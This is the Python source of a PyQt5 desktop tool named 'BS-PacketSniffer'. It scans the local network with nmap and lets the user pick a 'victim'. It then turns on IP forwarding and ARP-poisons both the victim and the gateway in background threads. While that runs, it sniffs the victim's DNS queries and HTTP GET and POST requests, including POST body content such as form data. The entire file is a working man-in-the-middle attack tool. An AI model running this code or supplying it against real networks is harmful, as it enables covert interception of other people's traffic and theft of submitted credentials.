from PyQt5 import QtWidgets , QtGui,QtCore
from arp_ui import Ui_MainWindow
import threading
from scapy.all import *
import nmap
import socket
import os
from datetime import datetime
import sys
import time

class Stream(QtCore.QObject):
    newText = QtCore.pyqtSignal(str)
    def write(self, text):
        self.newText.emit(str(text))


class MyWindow(QtWidgets.QMainWindow,Ui_MainWindow):
    SNIFF_SERVICE = None
    End_Flag = False
    V_IP = None
    GW_IP = None
    INTERFACE = None
    V_MAC = None
    GW_MAC = None
    def __init__(self):
        super().__init__()
        sys.stdout = Stream(newText=self.onUpdateText) ##redirect prints to 'action_info'
        self.setupUi(self)
        self.show()
        self.search_ip.clicked.connect(self.search_ip_thread)
        self.listWidget.itemClicked.connect(self.SelectedIP)
        self.dni_thread()
        self.dns_sniff.clicked.connect(self.SetDNS)
        self.http_get.clicked.connect(self.SetGet)
        self.http_post.clicked.connect(self.SetPost)
        self.cancel_op.clicked.connect(self.Cancel_op)
        self.actionAbout.triggered.connect(self.About)
        self.actionExit.triggered.connect(self.Quit)
    
    def onUpdateText(self, text):
        cursor = self.action_info.textCursor()
        cursor.movePosition(QtGui.QTextCursor.End)
        cursor.insertText(text)
        self.action_info.setTextCursor(cursor)
        self.action_info.ensureCursorVisible()  
    
    def __del__(self):
        sys.stdout = sys.__stdout__
    
    def SearchIp(self):
        self.listWidget.clear()
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        host = s.getsockname()[0]
        #print(host)
        s.close()
        nm = nmap.PortScanner()
        l = nm.scan(hosts = f'{host}/24', arguments = '-sn')
        p = l['scan'].keys()
        p = list(p)
        LenList = len(p)
        for i in range(LenList):
            item = QtWidgets.QListWidgetItem()
            item.setFlags(QtCore.Qt.ItemIsSelectable|QtCore.Qt.ItemIsUserCheckable|QtCore.Qt.ItemIsEnabled|QtCore.Qt.ItemIsTristate)
            item.setData(QtCore.Qt.UserRole,'IP')
            item.setText(p[i])
            self.listWidget.addItem(item)
    
    def search_ip_thread(self):
        thread = threading.Thread(target=self.SearchIp)
        thread.start()                
    
    def SelectedIP(self):
        row = self.listWidget.currentRow()
        item = self.listWidget.item(row)
        self.selected_ip.setText(item.text())
    
    
    
    
    def Detect_NetworkInterface(self):
        l = socket.if_nameindex()
        for tup in l:
            #print(tup[1])
            self.comboBox.addItem(tup[1]) 
    def dni_thread(self):
        thread = threading.Thread(target=self.Detect_NetworkInterface)
        thread.start()  
    
    
    #GET IP AND GATEWAY MAC ADDR
    def Gw_Ip_Mac(self):
       
        self.V_IP = self.selected_ip.text()
        self.GW_IP = self.gateway_ip.text()
        self.INTERFACE = self.comboBox.currentText()
        print(self.INTERFACE)
       
        while True:
            self.V_MAC = self.get_MACaddress(self.V_IP)
            self.GW_MAC = self.get_MACaddress(self.GW_IP)
            if self.V_MAC is None:
                print("Cannot find victim MAC address (" + self.V_IP + "), retrying...")
            elif self.GW_MAC is None:
                print("Cannot find victim MAC address (" + self.GW_IP + "), retrying...")
            else:
                break
        # showing ARP spoofing targets
        print("Attack targets have been found!")
        print("Victim: " + self.V_IP + " (" + self.V_MAC + ")")
        print("Gateway: " + self.GW_IP + " (" + self.GW_MAC + ")")
        print("Poisoning victim and gateway...")
 
    def get_MACaddress(self,ip):
        pack = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip, hwdst="ff:ff:ff:ff:ff:ff")
        resp = srp1(pack, verbose=0, timeout=2)
        if resp:
            return resp.hwsrc
        else:
            return None

    
    
    def sniff_request(self):
        #print("sniff_req")
        if self.SNIFF_SERVICE == "DNS":
            sniff(iface=self.INTERFACE, filter="udp port 53", prn=self.dns_sniff_request)
        elif self.SNIFF_SERVICE == "HTTP GET":
            sniff(iface=self.INTERFACE, filter="tcp port 80", prn=self.http_sniff_get_request)
        elif self.SNIFF_SERVICE == "HTTP POST":
            sniff(iface=self.INTERFACE, filter="tcp port 80", prn=self.http_sniff_post_request)
        else:
            print("Fatal Error: Missing action!\nAborting...")
            sys.exit(1)
    
    
    def dns_sniff_request(self,pkt):
        #print("dns_sniff_req")
        # adding sourcecondition
        try:
            pkt.getlayer(IP).src
            pkt.getlayer(Ether).src
        except AttributeError:
            return
        if (
            pkt.getlayer(IP).src == self.V_IP
            and pkt.getlayer(Ether).src == self.V_MAC
            and pkt.haslayer(DNS)
            and pkt.getlayer(DNS).qr == 0
        ):
            date = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
            print(
                date
                , " Service: DNS"
                , " Victim: "
                , pkt.getlayer(IP).src
                , " ("
                , pkt.getlayer(Ether).src
                , ") is resolving "
                , pkt.getlayer(DNS).qd.qname
            )

    def http_sniff_get_request(self,pkt):
        #print("http_get_req")
        if pkt.haslayer(TCP) and pkt.getlayer(TCP).dport == 80:
            try:
                # getting GET request and Host header
                raw_content = str(pkt.getlayer(TCP))
                lines = raw_content.split("\r\n")
                get_request = ""
                host_request = ""
                for line in lines:
                    if "GET" in line:
                        get_line = line.split(" ")
                        for index, l in enumerate(get_line):
                            if "GET" in l:
                                get_request = get_line[index + 1]
                    if "Host:" in line:
                        host_request = line.split(" ")[1]
                        # checking if packet has source fields
                try:
                    pkt.getlayer(IP).src
                    pkt.getlayer(Ether).src
                except AttributeError:
                    return
                    # displaying content if GET request is found and if it is from Victim
                if (
                    pkt.getlayer(IP).src == self.V_IP
                    and pkt.getlayer(Ether).src == self.V_MAC
                    and not get_request == ""
                ):
                    date = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
                    print(
                        date
                        , " Service: HTTP_GET"
                        , " Victim: "
                        , pkt.getlayer(IP).src
                        , " ("
                        , pkt.getlayer(Ether).src
                        , ") is requiring document: "
                        , host_request
                        , get_request
                    )
            except IndexError:
                return
    
    def http_sniff_post_request(self,pkt):
        #print("http_post_req")
        if pkt.haslayer(TCP) and pkt.getlayer(TCP).dport == 80:
            try:
                # getting GET request and Host header
                raw_content = str(pkt.getlayer(TCP))
                lines = raw_content.split("\r\n")
                post_request = ""
                host_request = ""
                found_first_empty_line = False
                post_content = ""
                for index, line in enumerate(lines):
                    if "POST" in line:
                        post_line = line.split(" ")
                        for index1, l in enumerate(post_line):
                            if "POST" in l:
                                post_request = post_line[index1 + 1]
                    if "Host:" in line:
                        host_request = line.split(" ")[1]
                    if line == "" and found_first_empty_line == False:
                        found_first_empty_line = True
                        post_content = lines[index + 1]
                        # checking if packet has source fields
                try:
                    pkt.getlayer(IP).src
                    pkt.getlayer(Ether).src
                except AttributeError:
                    return
                    # displaying content if GET request is found and if it is from Victim
                if (
                    pkt.getlayer(IP).src == self.V_IP
                    and pkt.getlayer(Ether).src == self.V_MAC
                    and not post_request == ""
                ):
                    date = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
                    print(
                        date
                        , " Service: HTTP_POST"
                        , " Victim: "
                        , pkt.getlayer(IP).src
                        , " ("
                        , pkt.getlayer(Ether).src
                        , ")"
                        , " is sending document: "
                        , host_request
                        , post_request
                        , " Content:"
                        , post_content
                    )
            except IndexError:
                return    
    
    # victim poisoning, sends ARP packets to victim by faking gateway
    def v_poison(self):
        print("Victim poisoning")
        p = Ether(dst=self.V_MAC) / ARP(psrc=self.GW_IP, pdst=self.V_IP, hwdst=self.V_MAC)
        while not self.End_Flag:
            try:
                srp1(p, verbose=0, timeout=1)
            except KeyboardInterrupt:
                sys.exit(1)
        #print("v_poison ended")

    # gateway poisoning, sends ARP packets to the gateway by faking victim
    def gw_poison(self):
        print("Gateway poisoning")
        p = Ether(dst=self.GW_MAC) / ARP(psrc=self.V_IP, pdst=self.GW_IP, hwdst=self.GW_MAC)
        while not self.End_Flag:
            try:
                srp1(p, verbose=0, timeout=1)
            except KeyboardInterrupt:
                sys.exit(1)
        #print("gwpoison ended")
    
    #main thread
    def main_op_thread(self):
        th = threading.Thread(target=self.main_op)
        th.setDaemon(True)
        th.start()
    
    def main_op(self):
        self.Gw_Ip_Mac()
        vthread = []
        gwthread = []
        print( self.V_IP,self.GW_IP,self.INTERFACE,self.GW_MAC,self.V_MAC)
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        #global vpoison,gwpoison
        while True:
            vpoison = threading.Thread(target=self.v_poison)
            vpoison.setDaemon(True)
            vthread.append(vpoison)
            vpoison.start()                 

            gwpoison = threading.Thread(target=self.gw_poison)
            gwpoison.setDaemon(True)
            gwthread.append(gwpoison)
            gwpoison.start()
            self.sniff_request()
            
    def SetDNS(self):
        self.SNIFF_SERVICE = "DNS"
        self.main_op_thread()
    def SetGet(self):
        self.SNIFF_SERVICE = "HTTP GET"
        self.main_op_thread()    
    def SetPost(self):
        self.SNIFF_SERVICE = "HTTP POST"
        self.main_op_thread()
    
    """
    def restorearp(targetip, targetmac, sourceip, sourcemac):
        packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
        send(packet, verbose=False)
        print "ARP Table restored to normal for", targetip    
    """
    
    def restorearp1(self):
        packet = ARP(op=2 , hwsrc=self.GW_MAC , psrc= self.GW_IP, hwdst= self.V_MAC , pdst= self.V_IP)
        send(packet, verbose=False)
        print("ARP Table restored to normal for",self.V_IP)
    
    def restorearp2(self):
        packet = ARP(op=2 , hwsrc=self.V_MAC , psrc= self.V_IP, hwdst= self.GW_MAC , pdst= self.GW_IP)
        send(packet, verbose=False)
        print("ARP Table restored to normal for",self.GW_IP)    
        
    
    def Cancel_op(self):
        if self.SNIFF_SERVICE == None:
            msg = QtWidgets.QMessageBox()
            msg.setWindowTitle("Cancel")
            msg.setText("There is no operation to cancel!")
            msg.setIcon(QtWidgets.QMessageBox.Information)
            msg.exec_()  
        
        else:
            #--------------------------------------------
            self.V_IP = self.selected_ip.text()
            self.GW_IP = self.gateway_ip.text()
            
            self.V_MAC = self.get_MACaddress(self.V_IP)
            self.GW_MAC = self.get_MACaddress(self.GW_IP)
            #---------------------------------------------
            print(self.V_IP,self.GW_IP,self.GW_MAC,self.V_MAC)
            
            self.End_Flag = True
            self.restorearp1()
            self.restorearp2()
                
            msg = QtWidgets.QMessageBox()
            msg.setWindowTitle("Cancel")
            msg.setText("The program will exit to end the operation!")
            msg.setIcon(QtWidgets.QMessageBox.Information)
            msg.buttonClicked.connect(self.popup_clicked)
            msg.exec_()
        
    def popup_clicked(self, i):
        QtWidgets.QApplication.quit()   

     
    def Quit(self):
        if self.SNIFF_SERVICE == None:
            QtWidgets.QApplication.quit()  
        else:
            #--------------------------------------------
            self.V_IP = self.selected_ip.text()
            self.GW_IP = self.gateway_ip.text()
            
            self.V_MAC = self.get_MACaddress(self.V_IP)
            self.GW_MAC = self.get_MACaddress(self.GW_IP)
            #---------------------------------------------
            print(self.V_IP,self.GW_IP,self.GW_MAC,self.V_MAC)
            
            self.End_Flag = True
            self.restorearp1()
            self.restorearp2()
            
            QtWidgets.QApplication.quit()     
    
    def About(self):
        msg = QtWidgets.QMessageBox()
        msg.setWindowTitle("About")
        msg.setText("BS-PacketSniffer:\nVersion:1.0\nDeveloper:Oussama Ben Sassi")
        msg.setIcon(QtWidgets.QMessageBox.Information)
        msg.exec_()              
               


app = QtWidgets.QApplication(sys.argv)
win = MyWindow()
sys.exit(app.exec_())        
